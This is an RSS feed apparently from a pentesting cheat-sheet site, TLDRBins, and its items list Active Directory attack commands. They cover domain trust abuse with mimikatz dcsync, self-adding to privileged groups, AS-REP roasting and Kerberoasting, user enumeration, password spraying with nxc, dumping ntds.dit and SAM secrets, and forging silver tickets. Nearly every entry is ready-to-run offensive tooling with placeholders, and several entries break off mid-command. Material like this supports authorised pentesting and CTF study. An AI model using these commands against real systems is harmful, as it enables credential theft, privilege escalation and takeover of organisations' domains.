channel.title: Domain Controller on TLDRBins
channel.description: Recent content in Domain Controller on TLDRBins

item.title: Abuse Parent Child Domain Trusts
item.description: Privesc from DA (Domain Admin) to EA (Enterprise Admin) Windows 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * # Returns a list of trusted domains nltest /domain_trusts # Gets a collection of the trust relationships of the current forest ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID ./mimikatz.exe 'lsadump::trust' 'exit' 3. Get krbtgt hash of current domain ./mimikatz.exe 'lsadump::dcsync /all /csv' 'exit' 4.

item.title: AddSelf
item.description: Privesc #1: Add self to group (From Linux) powerview.py bloodyAD # Connect sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_DOMAIN>' # Add self to group Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USERNAME> # Check Get-DomainGroupMember -Identity <TARGET_GROUP> # Exit and login again to apply changes Add-DomainObjectAcl -TargetIdentity <ANOTHER_GROUP> -PrincipalIdentity <USERNAME> -Rights fullcontrol # Check Get-DomainObjectAcl -Identity <TARGET_USER_IN_ANOTHER_GROUP> -Where 'SecurityIdentifier contains <USERNAME>' Ref: powerview.py # Add self to group python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC> add groupMember <TARGET_GROUP> <USERNAME> # With Kerberos python3 bloodyAD.

item.title: Kerberoasting
item.description: AS_REP Roasting Impacket nxc # Multiple valid usernames impacket-GetNPUsers <DOMAIN>/ -usersfile <USERS_FILE> -no-pass -dc-ip <DC> # Single user without creds impacket-GetNPUsers -no-pass -dc-ip <TARGET> <DOMAIN>/<USER> # Multiple valid usernames (nxc) nxc ldap <TARGET> -u <USERS_FILE> -p '' --asreproast as_rep_hashes.txt Kerberoasting (From Linux) Impacket nxc # Fix time skew sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> Note: Times skew have to be within 5 minutes in kerberos # Kerberoasting without cred sudo ntpdate -s <DC> && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE_PREAUTH> -usersfile <USERS_FILE> -dc-host <DC_IP> <DOMAIN>/ nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --kerberoasting kerberoast_hashes.

item.title: Kerberos
item.description: Users enum kerbrute kerbrute userenum --domain <DOMAIN> --dc <DC> <USERNAMES_FILE> Ref: kerbrute Usernames generator username-anarchy ./username-anarchy -i <USERS_FILE> | tee <USERNAMES_FILE> Ref: username-anarchy Generate Kerberos ticket (From Linux) Impacket Kinit # Auth with password sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>' # Auth with hash sudo ntpdate -s <DC> && impacket-getTGT -hashes :<HASH> '<DOMAIN>/<USER>' export KRB5CCNAME=<USER>.ccache # Check ticket klist # Step 0: Installation sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to '/etc/hosts' (Try different order if not work) <TARGET> <DC> <DOMAIN> # Step 2: Add domain controller as a DNS server to '/etc/resolv.

item.title: Machine Account
item.description: Abuse #1: Microsoft virtual account 1. Create a ticket from Microsoft virtual account Windows .\rubeus.exe tgtdeleg /nowrap /ptt 2. Secrets Dump Linux Windows 3. Convert kirbi to ccache python3 rubeustoccache.py <BASE64_TICKET> secrets.kirbi secrets.ccache 4. Secrets Dump export KRB5CCNAME=secrets.ccache sudo ntpdate -s <DC> && impacket-secretsdump -k -no-pass -just-dc-user administrator Ref: RubeusToCcache 1. TO-DO TO-DO

item.title: NetExec (nxc)
item.description: Basic Commands # Single user and password nxc smb <TARGET> -u <USER> -p '<PASSWORD>' # Single user and password (Active Directory) nxc smb -u <USER> -p '<PASSWORD>' -d <DOMAIN> <TARGET> # Multiple users or passwords nxc smb -u <USERNAMES> -p '<PASSWORD>' -d <DOMAIN> <TARGET> --continue-on-success # Match username to corresponding password nxc smb <TARGET> -u <USERNAMES> -p <PASSWORDS> --no-bruteforce --continue-on-success # With LM Hash:NT Hash nxc smb <TARGET> -u <USER> -H <LM>:<NT> # With Kerberos, or STATUS_ACCOUNT_RESTRICTION (NTLM disabled) nxc smb -u <USER> -p '<PASSWORD>' -d <DOMAIN> -k <TARGET> Supported protocols +----------------------------------------------------------+ | ftp | ldap | mssql | rdp | smb | ssh | vnc | winrm | wmi | +----------------------------------------------------------+ RID Brute nxc smb <TARGET> -u guest -p '' --rid-brute 10000 User Enum (Authenticated) nxc smb <TARGET> -u <USER> -p '<PASSWORD>' -d <DOMAIN> --users Ref: Download nxc

item.title: RPC
item.description: Remote Procedure Call Tools rpcclient impacket # Connect without creds rpcclient -U '' -N <TARGET> # Connect with creds rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> # Inline execute command rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'querydispinfo' Basic Commands # General info querydispinfo # List of users enumdomusers # List of groups enumdomgroups # Query group by rid querygroup <RID> # Query group member by rid querygroupmem <RID> # Query user by rid queryuser <RID> # Look up a user lookupnames <USER> # Look up by SID lookupsids <SID> impacket-lookupsid '<USER>:<PASSWORD>@<TARGET>'

item.title: secretsdump
item.description: Convert ntds.dit to .sqlite ntdsdotsqlite ntds.dit --system SYSTEM -o ntds.sqlite Ref: ntdsdotsqlite With ntds.dit and SYSTEM hive impacket impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With Dcsync right impacket nxc impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>' nxc smb -dc-ip <DC> -u <USER> -H <HASH> --ntds

item.title: Silver Ticket
item.description: Silver Ticket Attack Linux Windows 1. Get service principle name (SPN) sudo ntpdate -s <DC> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -request -k # If NTLM auth is disabled sudo ntpdate -s <DC> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-host <DC> -request -k 2. Generate NTLM iconv -f ASCII -t UTF-16LE <(printf '<PASSWORD>') | openssl dgst -md4 3. Get domain SID sudo ntpdate -s <DC> && impacket-getPac -targetUser administrator '<DOMAIN>/<USER>:<PASSWORD>' 4. Generate Silver Ticket impacket-ticketer -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> -dc-ip <DC> -spn <SPN> administrator 5.
